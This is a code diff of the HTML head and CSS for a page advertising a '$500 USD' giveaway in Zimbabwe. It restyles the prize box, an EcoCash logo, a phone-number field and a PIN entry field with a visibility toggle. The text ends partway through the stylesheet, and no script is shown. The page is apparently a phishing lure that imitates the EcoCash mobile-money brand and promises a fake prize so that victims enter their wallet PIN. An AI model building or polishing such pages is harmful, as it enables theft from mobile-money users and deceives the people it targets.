@@ -3,13 +3,15 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-    <title>$500 USD Giveaway • Zimbabwe</title>
+    <title>Win $500 USD • Zimbabwe Promo</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
     <style>
-        /* ─── RESET ─── */
-        * {
+        /* ─── RESET & BASE ─── */
+        *,
+        *::before,
+        *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
@@ -19,921 +21,485 @@
             --gold: #f5b342;
             --gold-light: #ffd966;
             --gold-dark: #c78a2b;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.08);
-            --glass-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
-            --glass-blur: 20px;
+            --bg-dark: #0b0d12;
+            --bg-card: rgba(255, 255, 255, 0.04);
+            --text-primary: #f0edea;
+            --text-secondary: #a8a3a0;
+            --border-light: rgba(255, 255, 255, 0.08);
+            --shadow-glow: 0 0 60px rgba(245, 179, 66, 0.12);
             --radius: 20px;
+            --transition: 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+            --ecocash-green: #00a859;
+            --ecocash-yellow: #f7b731;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            height: 100%;
         }
 
         body {
-            font-family: 'Inter', -apple-system, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            background: #0a0c12;
-            color: #fff;
-            overflow: hidden;
             position: relative;
+            overflow-x: hidden;
+            background-image:
+                radial-gradient(ellipse at 30% 40%, rgba(245, 179, 66, 0.15) 0%, transparent 55%),
+                radial-gradient(ellipse at 70% 60%, rgba(245, 179, 66, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 100%, rgba(245, 179, 66, 0.05) 0%, transparent 40%);
+            background-attachment: fixed;
         }
 
-        /* ─── VIDEO BACKGROUND ─── */
-        #video-bg {
+        /* ─── FALLING DOLLARS BACKGROUND ─── */
+        #dollar-rain {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            pointer-events: none;
             z-index: 0;
-            background: #0a0c12;
             overflow: hidden;
+            opacity: 0.4;
         }
-
-        #video-bg video {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            min-width: 100%;
-            min-height: 100%;
-            transform: translate(-50%, -50%);
-            object-fit: cover;
-        }
-
-        .video-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(ellipse at center, transparent 30%, rgba(0, 0, 0, 0.75) 100%);
-            z-index: 1;
-            pointer-events: none;
-        }
-
-        /* ─── FLASH OVERLAY ─── */
-        .flash-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 5;
-            background: radial-gradient(circle at center, rgba(245, 179, 66, 0.1), transparent 70%);
-            animation: flashPulse 2s ease-in-out infinite;
-        }
-
-        @keyframes flashPulse {
-            0%, 100% { opacity: 0.3; transform: scale(1); }
-            50% { opacity: 0.8; transform: scale(1.1); }
-        }
-
-        /* ─── SPARKLES ─── */
-        .sparkle-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 4;
-            overflow: hidden;
-        }
-
-        .sparkle {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: var(--gold-light);
-            border-radius: 50%;
-            animation: sparkleFloat 3s ease-in-out infinite;
-            box-shadow: 0 0 20px rgba(245, 179, 66, 0.6);
-        }
-
-        .sparkle:nth-child(1) { top: 10%; left: 15%; animation-delay: 0s; }
-        .sparkle:nth-child(2) { top: 20%; left: 85%; animation-delay: 0.5s; }
-        .sparkle:nth-child(3) { top: 60%; left: 10%; animation-delay: 1s; }
-        .sparkle:nth-child(4) { top: 70%; left: 90%; animation-delay: 1.5s; }
-        .sparkle:nth-child(5) { top: 40%; left: 50%; animation-delay: 2s; }
-        .sparkle:nth-child(6) { top: 85%; left: 30%; animation-delay: 0.8s; }
-        .sparkle:nth-child(7) { top: 15%; left: 50%; animation-delay: 1.2s; }
-        .sparkle:nth-child(8) { top: 50%; left: 75%; animation-delay: 1.8s; }
-
-        @keyframes sparkleFloat {
-            0%, 100% { transform: translateY(0) scale(1); opacity: 0.3; }
-            50% { transform: translateY(-30px) scale(2); opacity: 1; }
-        }
-
-        /* ─── CROWD SCENE ─── */
-        .crowd-scene {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 30%;
-            z-index: 2;
-            pointer-events: none;
-            overflow: hidden;
-        }
-
-        .crowd {
-            display: flex;
-            align-items: flex-end;
-            justify-content: space-around;
-            height: 100%;
-            padding: 0 15px;
-            gap: 4px;
-        }
-
-        .person {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            animation: bob 3s ease-in-out infinite;
-            opacity: 0.5;
-        }
-
-        .person:nth-child(odd) { animation-delay: 0.3s; opacity: 0.7; }
-        .person:nth-child(3n) { animation-delay: 0.7s; opacity: 0.6; }
-        .person:nth-child(5n+2) { animation-delay: 0.1s; opacity: 0.8; }
-
-        @keyframes bob {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-6px); }
-        }
-
-        .head {
-            width: 18px;
-            height: 18px;
-            background: radial-gradient(ellipse at 40% 30%, rgba(60,60,70,0.8), rgba(20,20,25,0.9));
-            border-radius: 50%;
-            margin-bottom: -3px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .head .ring {
-            position: absolute;
-            top: -6px;
-            left: -6px;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            border: 2px solid rgba(245, 179, 66, 0.25);
-            animation: ringPulse 1.8s ease-out infinite;
-            pointer-events: none;
-        }
-
-        .head .ring:nth-child(2) {
-            animation-delay: 0.6s;
-            border-color: rgba(74, 222, 128, 0.15);
-        }
-
-        @keyframes ringPulse {
-            0% { transform: scale(0.7); opacity: 1; }
-            100% { transform: scale(2); opacity: 0; }
-        }
-
-        .body {
-            width: 26px;
-            height: 32px;
-            background: radial-gradient(ellipse at 30% 30%, rgba(40,40,50,0.8), rgba(10,10,15,0.95));
-            border-radius: 8px 8px 4px 4px;
-            position: relative;
-            border: 1px solid rgba(255,255,255,0.03);
-        }
-
-        .phone {
-            position: absolute;
-            right: -12px;
-            top: 6px;
-            width: 20px;
-            height: 16px;
-            background: radial-gradient(ellipse at 30% 30%, rgba(50,50,60,0.7), rgba(20,20,25,0.8));
-            border-radius: 6px 6px 2px 2px;
-            animation: tap 2.2s ease-in-out infinite;
-        }
-
-        .phone::before {
-            content: '📱';
-            position: absolute;
-            top: -10px;
-            left: -2px;
-            font-size: 12px;
-            animation: glow 1.6s ease-in-out infinite;
-        }
-
-        @keyframes tap {
-            0%, 100% { transform: rotate(-8deg) translateY(0); }
-            30% { transform: rotate(-3deg) translateY(-4px); }
-            60% { transform: rotate(-12deg) translateY(2px); }
-        }
-
-        @keyframes glow {
-            0%, 100% { opacity: 0.7; transform: scale(1); }
-            50% { opacity: 1; transform: scale(1.1); filter: drop-shadow(0 0 10px rgba(245,179,66,0.4)); }
-        }
-
-        .person.excited .body {
-            animation: jump 1.2s ease-in-out infinite;
-        }
-
-        @keyframes jump {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-14px); }
-        }
-
-        .person.excited .phone {
-            animation: excitedTap 0.9s ease-in-out infinite;
-        }
-
-        @keyframes excitedTap {
-            0%, 100% { transform: rotate(-12deg) translateY(0); }
-            50% { transform: rotate(-3deg) translateY(-8px); }
-        }
-
-        /* Crowd confetti */
-        .crowd-confetti {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            overflow: hidden;
-        }
-
-        .crowd-confetti span {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            border-radius: 1px;
-            animation: confettiFall 4.5s linear infinite;
-            opacity: 0;
-        }
-
-        .crowd-confetti span:nth-child(1) { left: 8%; animation-delay: 0s; background: #f5b342; }
-        .crowd-confetti span:nth-child(2) { left: 18%; animation-delay: 1.4s; background: #4ade80; }
-        .crowd-confetti span:nth-child(3) { left: 28%; animation-delay: 0.6s; background: #f87171; }
-        .crowd-confetti span:nth-child(4) { left: 42%; animation-delay: 2.2s; background: #ffd966; }
-        .crowd-confetti span:nth-child(5) { left: 55%; animation-delay: 0.9s; background: #c084fc; }
-        .crowd-confetti span:nth-child(6) { left: 65%; animation-delay: 1.7s; background: #f472b6; }
-        .crowd-confetti span:nth-child(7) { left: 75%; animation-delay: 0.4s; background: #f5b342; }
-        .crowd-confetti span:nth-child(8) { left: 88%; animation-delay: 2s; background: #4ade80; }
-        .crowd-confetti span:nth-child(9) { left: 12%; animation-delay: 2.8s; background: #60a5fa; }
-        .crowd-confetti span:nth-child(10) { left: 48%; animation-delay: 0.8s; background: #f87171; }
-        .crowd-confetti span:nth-child(11) { left: 72%; animation-delay: 1.5s; background: #ffd966; }
-        .crowd-confetti span:nth-child(12) { left: 32%; animation-delay: 1s; background: #c084fc; }
-
-        @keyframes confettiFall {
-            0% { transform: translateY(-20px) rotate(0) scale(0); opacity: 0; }
-            15% { opacity: 0.8; transform: translateY(0) rotate(60deg) scale(1); }
-            85% { opacity: 0.8; }
-            100% { transform: translateY(80px) rotate(180deg) scale(0.4); opacity: 0; }
-        }
-
-        /* ─── FALLING DOLLARS ─── */
-        #dollars {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-            overflow: hidden;
-            opacity: 0.12;
-        }
-
         .dollar {
             position: absolute;
-            top: -40px;
-            font-size: 20px;
+            top: -50px;
+            font-size: 18px;
+            font-weight: 600;
+            color: rgba(245, 179, 66, 0.25);
             animation: fall linear infinite;
             user-select: none;
-            filter: drop-shadow(0 0 10px rgba(245, 179, 66, 0.1));
+            will-change: transform;
+            text-shadow: 0 0 12px rgba(245, 179, 66, 0.15);
         }
-
         @keyframes fall {
-            0% { transform: translateY(0) rotate(0deg) scale(0.8); opacity: 0; }
-            10% { opacity: 1; }
-            100% { transform: translateY(calc(100vh + 100px)) rotate(720deg) scale(1.2); opacity: 0; }
+            0% {
+                transform: translateY(-50px) rotate(0deg) scale(0.8);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(calc(100vh + 100px)) rotate(720deg) scale(1.2);
+                opacity: 0.2;
+            }
         }
 
-        /* ─── SCANLINES ─── */
-        .scanlines {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
-            pointer-events: none;
-            z-index: 3;
-            animation: scan 8s linear infinite;
+        /* ─── SCROLLBAR ─── */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-dark);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--gold-dark);
+            border-radius: 10px;
         }
 
-        @keyframes scan {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(4px); }
-        }
-
-        /* ─── GLASS CARD ─── */
+        /* ─── MAIN CARD ─── */
         .card {
-            max-width: 480px;
+            max-width: 500px;
             width: 100%;
-            background: var(--glass-bg);
-            backdrop-filter: blur(var(--glass-blur)) saturate(1.5);
-            -webkit-backdrop-filter: blur(var(--glass-blur)) saturate(1.5);
-            border: 1px solid var(--glass-border);
+            background: var(--bg-card);
+            backdrop-filter: blur(24px) saturate(1.4);
+            -webkit-backdrop-filter: blur(24px) saturate(1.4);
+            border: 1px solid var(--border-light);
             border-radius: var(--radius);
-            padding: 36px 28px 32px;
-            box-shadow: var(--glass-shadow), inset 0 1px 0 rgba(255,255,255,0.06), 0 0 80px rgba(245, 179, 66, 0.05);
+            padding: 40px 32px 36px;
+            box-shadow: var(--shadow-glow), 0 20px 60px rgba(0, 0, 0, 0.5);
             position: relative;
-            z-index: 10;
-            animation: fadeIn 0.8s ease forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px) scale(0.96); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
+            z-index: 1;
+            overflow: hidden;
+            transition: var(--transition);
         }
 
         .card::before {
             content: '';
             position: absolute;
-            top: -60%;
-            left: -60%;
-            width: 220%;
-            height: 220%;
-            background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.04) 0%, transparent 60%);
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(245, 179, 66, 0.04) 0%, transparent 70%);
             pointer-events: none;
             z-index: 0;
-            animation: shimmer 10s ease-in-out infinite;
         }
 
-        @keyframes shimmer {
-            0%, 100% { transform: translate(-10%, -10%); }
-            50% { transform: translate(10%, 10%); }
+        .card>* {
+            position: relative;
+            z-index: 1;
         }
 
-        .card > * { position: relative; z-index: 1; }
-
-        /* ─── FLASHY BADGE ─── */
+        /* ─── HEADER / BADGE ─── */
         .badge {
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            background: rgba(245, 179, 66, 0.15);
-            backdrop-filter: blur(6px);
-            border: 1px solid rgba(245, 179, 66, 0.2);
-            border-radius: 50px;
-            padding: 5px 14px 5px 8px;
-            font-size: 10px;
+            background: rgba(245, 179, 66, 0.13);
+            border: 1px solid rgba(245, 179, 66, 0.18);
+            border-radius: 100px;
+            padding: 6px 16px 6px 10px;
+            font-size: 11px;
             font-weight: 600;
+            letter-spacing: 0.3px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
             color: var(--gold-light);
-            margin-bottom: 16px;
-            animation: badgePulse 2s ease-in-out infinite;
-            box-shadow: 0 0 30px rgba(245, 179, 66, 0.1);
+            margin-bottom: 20px;
         }
-
-        @keyframes badgePulse {
-            0%, 100% { box-shadow: 0 0 30px rgba(245, 179, 66, 0.1); }
-            50% { box-shadow: 0 0 60px rgba(245, 179, 66, 0.2); }
-        }
-
         .badge .dot {
-            width: 6px;
-            height: 6px;
+            width: 7px;
+            height: 7px;
             border-radius: 50%;
             background: #4ade80;
-            animation: pulse 1.8s ease-in-out infinite;
+            display: inline-block;
+            animation: pulse-dot 1.8s ease-in-out infinite;
+        }
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(0.75);
+            }
         }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.4; transform: scale(0.7); }
-        }
-
-        /* ─── TITLE ─── */
+        /* ─── TITLE & SUBTITLE ─── */
         .title {
-            font-size: 30px;
+            font-size: 32px;
             font-weight: 800;
             line-height: 1.15;
             letter-spacing: -0.5px;
-            margin-bottom: 4px;
+            margin-bottom: 8px;
         }
-
-        .title .gold {
+        .title .highlight {
             background: linear-gradient(135deg, var(--gold-light), var(--gold));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            animation: titleGlow 2s ease-in-out infinite;
         }
-
-        @keyframes titleGlow {
-            0%, 100% { filter: drop-shadow(0 0 10px rgba(245, 179, 66, 0.2)); }
-            50% { filter: drop-shadow(0 0 30px rgba(245, 179, 66, 0.5)); }
-        }
-
-        .sub-title {
+        .subtitle {
             font-size: 15px;
-            color: var(--gold-light);
-            font-weight: 600;
-            margin-bottom: 4px;
-            animation: textPulse 2s ease-in-out infinite;
-        }
-
-        @keyframes textPulse {
-            0%, 100% { opacity: 0.8; }
-            50% { opacity: 1; }
-        }
-
-        .desc {
-            font-size: 14px;
-            color: rgba(255,255,255,0.5);
+            color: var(--text-secondary);
             line-height: 1.6;
-            margin-bottom: 22px;
+            margin-bottom: 28px;
+        }
+        .subtitle strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+        .subtitle .flag {
+            display: inline-block;
+            margin: 0 2px;
         }
 
-        /* ─── FLASHY BOUNCING PRIZE BOX ─── */
-        .prize-box {
-            background: rgba(245, 179, 66, 0.08);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(245, 179, 66, 0.15);
+        /* ─── PRIZE DISPLAY ─── */
+        .prize-display {
+            background: rgba(245, 179, 66, 0.06);
+            border: 1px solid rgba(245, 179, 66, 0.12);
             border-radius: 14px;
-            padding: 16px 18px;
+            padding: 18px 20px;
             display: flex;
             align-items: center;
             gap: 14px;
-            margin-bottom: 24px;
-            transition: 0.3s;
-            animation: bouncePrize 1.5s ease-in-out infinite;
-            position: relative;
-            cursor: default;
-            box-shadow: 0 4px 30px rgba(245, 179, 66, 0.1);
+            margin-bottom: 28px;
+            transition: var(--transition);
         }
-
-        .prize-box::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 130%;
-            height: 130%;
-            background: radial-gradient(ellipse at center, rgba(245, 179, 66, 0.12) 0%, transparent 70%);
-            pointer-events: none;
-            z-index: -1;
-            animation: glowPulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes bouncePrize {
-            0%, 100% {
-                transform: translateY(0) scale(1);
-                box-shadow: 0 4px 30px rgba(245, 179, 66, 0.1);
-            }
-            15% {
-                transform: translateY(-10px) scale(1.03);
-                box-shadow: 0 8px 50px rgba(245, 179, 66, 0.25);
-            }
-            30% {
-                transform: translateY(0) scale(1);
-                box-shadow: 0 4px 30px rgba(245, 179, 66, 0.1);
-            }
-            45% {
-                transform: translateY(-6px) scale(1.02);
-                box-shadow: 0 6px 40px rgba(245, 179, 66, 0.2);
-            }
-            60% {
-                transform: translateY(0) scale(1);
-                box-shadow: 0 4px 30px rgba(245, 179, 66, 0.1);
-            }
-            80% {
-                transform: translateY(-3px) scale(1.01);
-                box-shadow: 0 5px 35px rgba(245, 179, 66, 0.15);
-            }
-        }
-
-        @keyframes glowPulse {
-            0%, 100% { opacity: 0.5; transform: translate(-50%, -50%) scale(1); }
-            50% { opacity: 1; transform: translate(-50%, -50%) scale(1.3); }
-        }
-
-        .prize-box:hover {
-            animation-play-state: paused;
-            border-color: rgba(245, 179, 66, 0.35);
-        }
-
-        .prize-box .icon {
+        .prize-display .icon {
             font-size: 32px;
             line-height: 1;
-            animation: iconBounce 1.5s ease-in-out infinite;
+            flex-shrink: 0;
         }
-
-        @keyframes iconBounce {
-            0%, 100% { transform: scale(1) rotate(0deg); }
-            15% { transform: scale(1.2) rotate(-8deg); }
-            30% { transform: scale(1) rotate(0deg); }
-            45% { transform: scale(1.1) rotate(5deg); }
-            60% { transform: scale(1) rotate(0deg); }
+        .prize-display .info {
+            flex: 1;
         }
-
-        .prize-box .info { flex: 1; }
-        .prize-box .label {
-            font-size: 11px;
+        .prize-display .info .label {
+            font-size: 12px;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.6px;
             color: var(--gold-light);
             opacity: 0.8;
         }
-
-        .prize-box .amount {
-            font-size: 32px;
+        .prize-display .info .amount {
+            font-size: 26px;
             font-weight: 800;
             color: var(--gold);
-            display: inline-block;
-            animation: amountBounce 1.5s ease-in-out infinite;
-            text-shadow: 0 0 40px rgba(245, 179, 66, 0.2);
+            letter-spacing: -0.3px;
         }
-
-        @keyframes amountBounce {
-            0%, 100% { transform: scale(1); text-shadow: 0 0 40px rgba(245, 179, 66, 0.2); }
-            15% { transform: scale(1.1); text-shadow: 0 0 60px rgba(245, 179, 66, 0.4); }
-            30% { transform: scale(1); text-shadow: 0 0 40px rgba(245, 179, 66, 0.2); }
-            45% { transform: scale(1.05); text-shadow: 0 0 50px rgba(245, 179, 66, 0.3); }
-            60% { transform: scale(1); text-shadow: 0 0 40px rgba(245, 179, 66, 0.2); }
-        }
-
-        .prize-box .amount small {
-            font-size: 18px;
+        .prize-display .info .amount span {
+            font-size: 16px;
             font-weight: 600;
-            color: rgba(255,255,255,0.4);
-            animation: smallBounce 1.5s ease-in-out infinite;
+            color: var(--text-secondary);
         }
 
-        @keyframes smallBounce {
-            0%, 100% { transform: scale(1); }
-            15% { transform: scale(0.92); }
-            45% { transform: scale(0.95); }
+        /* ─── FORM ELEMENTS ─── */
+        .form-group {
+            margin-bottom: 20px;
         }
-
-        /* ─── WALLET BADGE ─── */
-        .wallet-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(0, 168, 89, 0.12);
-            backdrop-filter: blur(6px);
-            border: 1px solid rgba(0, 168, 89, 0.2);
-            border-radius: 50px;
-            padding: 3px 12px 3px 8px;
-            font-size: 11px;
-            font-weight: 600;
-            color: #4ade80;
-            margin-top: 4px;
-            animation: walletPulse 2s ease-in-out infinite;
-        }
-
-        @keyframes walletPulse {
-            0%, 100% { opacity: 0.7; box-shadow: 0 0 20px rgba(0, 168, 89, 0.05); }
-            50% { opacity: 1; box-shadow: 0 0 40px rgba(0, 168, 89, 0.15); }
-        }
-
-        .wallet-badge svg { width: 14px; height: 14px; }
-
-        /* ─── FORM ─── */
-        .form-group { margin-bottom: 18px; }
         .form-group label {
             display: block;
-            font-size: 12px;
+            font-size: 13px;
             font-weight: 600;
-            color: rgba(255,255,255,0.5);
-            margin-bottom: 5px;
-            letter-spacing: 0.3px;
+            margin-bottom: 6px;
+            color: var(--text-secondary);
+            letter-spacing: 0.2px;
         }
-        .form-group label .req { color: #f87171; }
-
-        .input-group {
-            display: flex;
-            align-items: center;
-            background: rgba(255,255,255,0.03);
-            backdrop-filter: blur(8px);
-            border: 1.5px solid rgba(255,255,255,0.06);
-            border-radius: 12px;
-            transition: 0.3s;
+        .form-group label .required {
+            color: #f87171;
+            margin-left: 2px;
         }
 
-        .input-group:focus-within {
-            border-color: var(--gold);
-            background: rgba(255,255,255,0.05);
-            box-shadow: 0 0 0 4px rgba(245,179,66,0.05), 0 0 30px rgba(245,179,66,0.05);
-        }
-
-        .input-group .prefix {
-            padding: 12px 0 12px 16px;
-            font-size: 15px;
-            font-weight: 600;
-            color: rgba(255,255,255,0.5);
-            white-space: nowrap;
-        }
-
-        .input-group input {
-            flex: 1;
-            padding: 12px 16px 12px 6px;
-            font-size: 15px;
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            font-size: 16px;
             font-family: inherit;
             font-weight: 500;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.07);
+            border-radius: 12px;
+            color: var(--text-primary);
+            outline: none;
+            transition: var(--transition);
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        .form-control:focus {
+            border-color: var(--gold);
+            background: rgba(255, 255, 255, 0.07);
+            box-shadow: 0 0 0 4px rgba(245, 179, 66, 0.08);
+        }
+        .form-control::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+            font-weight: 400;
+        }
+        .form-control.error {
+            border-color: #f87171;
+            box-shadow: 0 0 0 4px rgba(248, 113, 113, 0.08);
+        }
+        .form-control:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .form-hint {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 6px;
+            opacity: 0.7;
+        }
+        .form-hint.error-text {
+            color: #f87171;
+            opacity: 1;
+        }
+
+        /* ─── PHONE WITH PREFIX ─── */
+        .phone-prefix-group {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.07);
+            border-radius: 12px;
+            transition: var(--transition);
+        }
+        .phone-prefix-group:focus-within {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 4px rgba(245, 179, 66, 0.08);
+            background: rgba(255, 255, 255, 0.07);
+        }
+        .phone-prefix-group .prefix {
+            padding: 14px 0 14px 18px;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            white-space: nowrap;
             background: transparent;
             border: none;
-            color: #fff;
-            outline: none;
+            user-select: none;
+            opacity: 0.8;
         }
-
-        .input-group input::placeholder { color: rgba(255,255,255,0.15); }
-
-        .input-hint {
-            font-size: 11px;
-            color: rgba(255,255,255,0.3);
-            margin-top: 5px;
+        .phone-prefix-group .form-control {
+            border: none !important;
+            border-radius: 0 12px 12px 0 !important;
+            background: transparent !important;
+            padding-left: 8px;
+            box-shadow: none !important;
         }
-
-        .input-hint.error { color: #f87171; }
-
-        .phone-input input {
-            font-family: 'Inter', monospace;
-            letter-spacing: 1px;
-        }
-
-        .pin-wrap { position: relative; }
-
-        .pin-wrap .toggle {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 6px;
-            color: rgba(255,255,255,0.4);
-            font-size: 16px;
-            cursor: pointer;
-            padding: 4px 7px;
-            transition: 0.3s;
-            line-height: 1;
-        }
-
-        .pin-wrap .toggle:hover {
-            opacity: 1;
-            background: rgba(255,255,255,0.08);
+        .phone-prefix-group .form-control:focus {
+            box-shadow: none !important;
         }
 
         /* ─── ECOCASH LOGO ─── */
-        .ecocash {
+        .ecocash-logo {
             display: inline-flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
             background: linear-gradient(135deg, #00a859, #00c46a);
-            padding: 3px 12px 3px 8px;
-            border-radius: 50px;
+            padding: 4px 14px 4px 10px;
+            border-radius: 30px;
             color: #fff;
             font-weight: 700;
-            font-size: 12px;
-            box-shadow: 0 2px 16px rgba(0,168,89,0.2);
-            margin-right: 4px;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+            box-shadow: 0 2px 12px rgba(0, 168, 89, 0.3);
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+        .ecocash-logo svg {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+        .ecocash-logo .logo-text {
+            font-family: 'Inter', sans-serif;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+        }
+        .ecocash-logo .logo-text span {
+            color: #f7b731;
         }
 
-        .ecocash svg { width: 20px; height: 20px; }
-        .ecocash span { font-weight: 800; letter-spacing: 0.3px; }
-        .ecocash span em { color: #f7b731; font-style: normal; }
+        /* ─── PIN INPUT ─── */
+        .pin-wrapper {
+            position: relative;
+        }
+        .pin-wrapper .toggle-vis {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+            opacity: 0.6;
+            transition: var(--transition);
+        }
+        .pin-wrapper .toggle-vis:hover {
+            opacity: 1;
+        }
 
-        /* ─── FLASHY BUTTON ─── */
+        /* ─── BUTTON ─── */
         .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
             width: 100%;
-            padding: 15px 20px;
-            font-size: 15px;
+            padding: 16px 20px;
+            font-size: 16px;
             font-weight: 700;
             font-family: inherit;
             border: none;
             border-radius: 12px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: var(--transition);
             position: relative;
             overflow: hidden;
-            margin-top: 6px;
         }
-
         .btn-primary {
             background: linear-gradient(135deg, var(--gold), var(--gold-dark));
             color: #0b0d12;
-            box-shadow: 0 4px 30px rgba(245,179,66,0.25);
-            animation: btnPulse 2s ease-in-out infinite;
+            box-shadow: 0 4px 20px rgba(245, 179, 66, 0.25);
+            margin-top: 8px;
         }
-
-        @keyframes btnPulse {
-            0%, 100% { box-shadow: 0 4px 30px rgba(245,179,66,0.25); }
-            50% { box-shadow: 0 4px 50px rgba(245,179,66,0.4); }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(245, 179, 66, 0.35);
         }
-
-        .btn-primary::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: 0.6s;
+        .btn-primary:active:not(:disabled) {
+            transform: scale(0.97);
         }
-
-        .btn-primary:hover:not(:disabled)::before { left: 100%; }
-        .btn-primary:hover:not(:disabled) { transform: translateY(-2px) scale(1.02); box-shadow: 0 6px 50px rgba(245,179,66,0.4); }
-        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
 
         .btn .spinner {
             width: 20px;
             height: 20px;
-            border: 2.5px solid rgba(11,13,18,0.15);
+            border: 2.5px solid rgba(11, 13, 18, 0.15);
             border-top-color: #0b0d12;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
-            display: inline-block;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* ─── SUCCESS ─── */
-        .success {
+        /* ─── SUCCESS SCREEN ─── */
+        .success-screen {
             display: none;
             text-align: center;
-            padding: 16px 0 4px;
+            padding: 20px 0 8px;
             animation: fadeUp 0.6s ease forwards;
         }
+        .success-screen.active {
+            display: block;
+        }
 
-        .success.active { display: block; }
-
-        .success .check {
-            width: 72px;
-            height: 72px;
+        .success-screen .checkmark {
+            width: 80px;
+            height: 80px;
             border-radius: 50%;
             background: linear-gradient(135deg, #4ade80, #22c55e);
